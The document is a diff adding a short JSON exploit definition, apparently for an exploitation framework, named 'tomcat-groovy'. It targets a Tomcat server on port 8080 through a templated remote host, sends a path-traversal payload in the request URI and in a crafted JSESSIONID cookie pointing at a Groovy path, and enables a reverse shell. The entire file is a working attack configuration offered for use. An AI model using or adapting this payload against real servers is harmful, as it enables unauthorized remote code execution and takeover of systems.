@@ -1,0 +1,7 @@
+{
+    "name": "tomcat-groovy",
+    "remote_host": "{{.RHOST}}",
+    "remote_port": "8080",
+    "http_exploit": [{"uri": "/index.jsp../"}, {"method":"get"}, {"header":{"JSESSIONID":"../../../../../usr/local/tomcat/groovy"}}],
+    "reverse_shell": true 
+}
